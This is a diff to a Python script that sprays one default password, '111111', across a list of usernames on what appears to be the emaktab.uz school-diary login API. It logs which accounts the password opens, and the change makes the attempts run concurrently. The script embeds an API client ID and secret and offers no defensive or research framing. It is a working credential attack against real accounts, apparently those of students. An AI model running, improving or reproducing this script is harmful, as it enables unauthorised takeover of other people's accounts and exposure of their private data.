@@ -1,5 +1,7 @@
 import requests
 import json
+import asyncio
+
 
 logins = [
     "abdumalikovibrohim02",
@@ -57,7 +59,9 @@ URL = "https://api.emaktab.uz/mobile/v10.0/authorizations/bycredentials"
 suc_login = []
 fail_login = []
 
-def login_in(username: str, password: str):
+
+
+async def login_in(username: str, password: str):
     data = {
     "clientId": "B70AECAA-A0E2-4E0D-A147-2D6051A1397B",
     "clientSecret": "C0A8880F-30CA-4877-ADD2-26ED9672EC93",
@@ -83,9 +87,13 @@ def login_in(username: str, password: str):
     else:
         print(f"ERROR OCCURED for {username}")
         print(response.status_code)
-    
-for login in logins:
-    login_in(login, "111111")
 
+
+async def main():
+    await asyncio.gather(*(login_in(login,"111111") for login in logins))
+
+
+
+asyncio.run(main())
 print(f"--------\nSUCCESSFUL LOGINS:{len(suc_login)}--------\n{suc_login}\n-----------")
 print(f"--------\nFAILED LOGINS:{len(fail_login)}--------\n{fail_login}\n-----------")
